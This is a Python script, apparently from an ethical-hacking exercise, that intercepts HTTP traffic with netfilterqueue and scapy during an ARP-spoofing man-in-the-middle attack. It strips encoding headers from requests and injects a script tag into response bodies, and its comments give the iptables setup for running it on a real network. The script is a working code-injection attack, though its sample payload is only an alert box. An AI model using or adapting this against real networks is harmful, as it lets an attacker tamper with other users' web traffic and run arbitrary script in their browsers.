#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http #you need to pip install scapy_http 
import re

#if tested on a real network:
#   -launch arp spoofer
#   -set iptables as follow: iptables -i forward -j nfqueue --queue-num 0
#   -lauch this script
#
#once you are done, flush the iptables: iptables --flush

#set the iptables as follow to test on local machine test on local machine
#iptables -i output -j nfqueue --queue-num 0
#iptables -i input -j nfqueue --queue-num 0

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            print(scapy_packet[http.HTTPRequest].Headers)
            load = re.sub("Accept-Encoding.*?\\r\\n","", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response!")
            load = load.replace("</body>","<script>alert('test')</script></body>")


        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet)) 

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

